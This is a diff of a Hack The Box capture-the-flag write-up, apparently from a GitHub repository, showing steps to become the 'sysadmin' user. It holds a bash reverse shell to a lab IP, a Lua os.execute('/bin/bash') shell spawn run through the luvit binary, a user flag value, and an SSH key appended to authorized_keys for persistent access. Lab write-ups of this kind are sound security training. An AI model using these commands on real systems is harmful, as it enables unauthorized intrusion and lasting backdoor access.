@@ -117,12 +117,12 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.4/1337 0>&1'
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/30fcc402-ea95-46e5-83d8-9b12e350fb76)
 
 
-19. Remembering we can specify a username, hence introducing 2 steps can be done to gain access to sysadmin's home directory.
-20. The first step is using the **luvit** binary, the second method is by generating the ssh-keys to get stable shell as **sysadmin**.
+19. Remembering we can specify a username, hence we could gain access to sysadmin's home directory.
+20. Let's use the **luvit** binary.
 
 ===
 
-### 1st Step
+### USING LUVIT
 
 - Sending shell spawn LOCs to lua.
 
@@ -139,16 +139,62 @@ echo "os.execute('/bin/bash');" > sysad.lua
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/54a0f835-d4c9-4fda-a9d1-840b85d5aa60)
 
 
-### 2nd Step
-
-- Generating ssh-keys
-
-  
 
 ## USER FLAG
 
 ```
 4835038ff249e1ae23de765fc1110e3d
+```
+
+21. Great! Now let's change our shell mode to interactive by executing `bash -i`, then add our ssh-key to sysadmin's authorized_keys.
+22. With this, we can have access directly without dropping reverse shell.
+
+```console
+Generate ssh key at our local machine.
+
+┌──(brandy㉿bread-yolk)-[~/.ssh]
+└─$ ssh-keygen
+Generating public/private ed25519 key pair.
+Enter file in which to save the key (/home/brandy/.ssh/id_ed25519): sysadmin
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in sysadmin
+Your public key has been saved in sysadmin.pub
+The key fingerprint is:
+SHA256:ExUTsfRZaVupYJr+VAwDiB+QPtNOGz92d+chutc2U5A brandy@bread-yolk
+The key's randomart image is:
++--[ED25519 256]--+
+|     .+ ..O+  ...|
+|     o o o O oo..|
+|    . o o = B..+ |
+|     + = +   +E  |
+|      = S   .  . |
+|       o * o o oo|
+|        . = o +.+|
+|           o . =.|
+|           .o . o|
++----[SHA256]-----+
+                                                                                                                                                                                             
+┌──(brandy㉿bread-yolk)-[~/.ssh]
+└─$ cat sysadmin.pub
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGlvFYfrNpHf4A8gXc+IB+B8xYMYE3ajJkruV47FkzhJ brandy@bread-yolk
+```
+
+23. Then, add it to sysadmin's authorized_keys file.
+
+```
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGlvFYfrNpHf4A8gXc+IB+B8xYMYE3ajJkruV47FkzhJ brandy@bread-yolk" >> authorized_keys
+```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6869268c-1acf-457a-96ca-95ca24c535b4)
+
+
+#### NOTES:
+
+```
+Remember to execute the ssh inside .ssh directory and don't forget to execute chmod 400 to id_rsa file.
 ```
 
 ## IMPORTANT LINKS
